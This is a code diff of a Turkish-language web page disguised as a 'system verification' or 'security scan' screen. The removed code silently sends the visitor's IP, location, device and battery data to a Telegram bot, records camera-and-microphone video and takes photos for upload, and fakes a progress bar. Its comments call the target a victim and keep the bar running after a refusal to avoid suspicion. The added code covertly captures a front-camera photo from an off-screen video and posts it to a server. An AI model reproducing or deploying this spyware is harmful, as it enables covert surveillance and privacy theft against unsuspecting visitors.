@@ -3,146 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Doğrulaması</title>
+    <title>Sistem Kontrolü</title>
     <style>
-        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
-        .progress-container { width: 80%; background-color: #333; border-radius: 20px; margin-top: 20px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 10px; background-color: #3498db; transition: width 0.1s linear; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { margin-top: 15px; font-size: 14px; color: #aaa; text-align: center; padding: 0 20px; }
+        /* Tasarım kısmı - Kullanıcı bir şey görmesin diye */
+        body {
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        /* Videoyu gizli tutuyoruz ama silmiyoruz (Siyah ekranı önlemek için önemli) */
+        #video {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+        }
+        .loading {
+            text-align: center;
+        }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <div class="progress-container">
-        <div class="progress-bar" id="bar"></div>
+    <div class="loading">
+        <h3>Sistem Yükleniyor...</h3>
+        <p>Lütfen bekleyiniz.</p>
     </div>
-    <div id="status">Güvenlik taraması yapılıyor... (%0)</div>
 
-    <video id="video" style="display:none" autoplay playsinline muted></video>
-    <canvas id="canvas" style="display:none"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const token = urlParams.get('t');
-        const id = urlParams.get('i');
-        // Bot 'arka' gönderirse environment, aksi halde user (ön)
-        const mode = urlParams.get('mode') === 'arka' ? 'environment' : 'user';
-
-        const botUrl = `https://api.telegram.org/bot${token}/`;
-
-        // 1. İzin İstemeden IP ve Cihaz Bilgisi Gönder
-        async function getInfo() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                let msg = `🛰 **Yeni Giriş Tespit Edildi!**\n\n` +
-                          `🌐 IP: ${data.ip}\n` +
-                          `📍 Konum: ${data.city} / ${data.country_name}\n` +
-                          `📱 Cihaz: ${navigator.platform}\n` +
-                          `🔋 Pil: ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'Bilinmiyor'}`;
-                
-                fetch(botUrl + `sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-            } catch (e) { console.log("Bilgi çekilemedi."); }
-        }
-
-        // 2. Kamera ve Video Kayıt (15 Saniye)
-        async function startHack() {
+        // Ayarlar
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        // 1. Kameraya Erişim İste
+        async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode }, 
-                    audio: true 
+                    video: { 
+                        facingMode: "user", // Ön kamera
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }, 
+                    audio: false 
                 });
                 
-                const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // Desteklenen video formatını bul (iPhone için video/mp4, Android için video/webm)
-                const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
-                const mediaRecorder = new MediaRecorder(stream, { mimeType });
-                let chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) chunks.push(e.data);
+                // 2. Görüntü akışı başladığında tetiklenir
+                video.oncanplay = function() {
+                    console.log("Kamera akışı başladı, bekleniyor...");
+                    
+                    // 3. Siyah ekranı önlemek için 2 saniye bekle (Kamera ısınma süresi)
+                    setTimeout(takePhoto, 2000);
                 };
-
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: mimeType });
-                    const formData = new FormData();
-                    formData.append('chat_id', id);
-                    formData.append('video', blob, 'kayit.mp4');
-                    formData.append('caption', '🎥 15 Saniyelik Video Kaydı Hazır!');
-                    
-                    await fetch(botUrl + 'sendVideo', { method: 'POST', body: formData });
-                    
-                    // İşlem bitince kanalları durdur
-                    stream.getTracks().forEach(track => track.stop());
-                };
-
-                // Kaydı Başlat
-                mediaRecorder.start();
-
-                // 15 Saniye Boyunca Çubuğu Doldur
-                let width = 0;
-                const bar = document.getElementById('bar');
-                const status = document.getElementById('status');
-                
-                const interval = setInterval(() => {
-                    width += 1;
-                    bar.style.width = width + '%';
-                    status.innerText = `Güvenlik taraması yapılıyor... (%${width})`;
-                    
-                    if (width >= 100) {
-                        clearInterval(interval);
-                        mediaRecorder.stop(); // 100% olunca videoyu bitir ve gönder
-                        status.innerText = "Doğrulama Başarılı! Yönlendiriliyorsunuz...";
-                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
-                    }
-                }, 150); // 150ms * 100 = 15 saniye
-
-                // Kayıt devam ederken 10 adet fotoğraf çek (Saniyede 1 tane)
-                const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
-                for (let i = 1; i <= 10; i++) {
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        canvas.toBlob(blob => {
-                            const fd = new FormData();
-                            fd.append('chat_id', id);
-                            fd.append('photo', blob, `foto_${i}.jpg`);
-                            fetch(botUrl + 'sendPhoto', { method: 'POST', body: fd });
-                        }, 'image/jpeg');
-                    }, i * 1500); 
-                }
 
             } catch (err) {
-                fetch(botUrl + `sendMessage?chat_id=${id}&text=${encodeURIComponent("❌ Kurban kamera iznini reddetti veya kamera bulunamadı.")}`);
-                // İzin verilmezse de çubuğu doldur ki şüphelenmesin
-                fakeLoad();
+                console.error("Kamera açma hatası:", err);
+                // Hata durumunda yapılacaklar (isteğe bağlı)
             }
         }
 
-        function fakeLoad() {
-            let width = 0;
-            const interval = setInterval(() => {
-                width += 1;
-                document.getElementById('bar').style.width = width + '%';
-                document.getElementById('status').innerText = `Güvenlik taraması yapılıyor... (%${width})`;
-                if (width >= 100) {
-                    clearInterval(interval);
-                    window.location.href = "https://www.google.com";
-                }
-            }, 100);
+        // 4. Fotoğraf Çekme Fonksiyonu
+        function takePhoto() {
+            const context = canvas.getContext('2d');
+            
+            // Canvas boyutlarını video boyutlarına eşitle
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Videodan kareyi yakala
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // 5. Görüntüyü Base64 formatına çevir (JPEG)
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // 6. Veriyi Sunucuya Gönder
+            sendToServer(imageData);
         }
 
-        // Başlat
-        getInfo(); 
-        startHack();
+        // 7. Veriyi Gönderme (Backend bağlantın)
+        function sendToServer(data) {
+            fetch('/upload', { // Burayı kendi sunucu yolunla değiştir
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    image: data
+                })
+            })
+            .then(response => {
+                console.log("Veri başarıyla gönderildi.");
+                // Gönderimden sonra istersen kullanıcıyı başka yere yönlendir
+                // window.location.href = "https://t.me/NXSStore_bot";
+            })
+            .catch(error => {
+                console.error("Gönderim hatası:", error);
+            });
+        }
 
+        // Sayfa yüklendiğinde kamerayı başlat
+        window.onload = startCamera;
     </script>
 </body>
 </html>
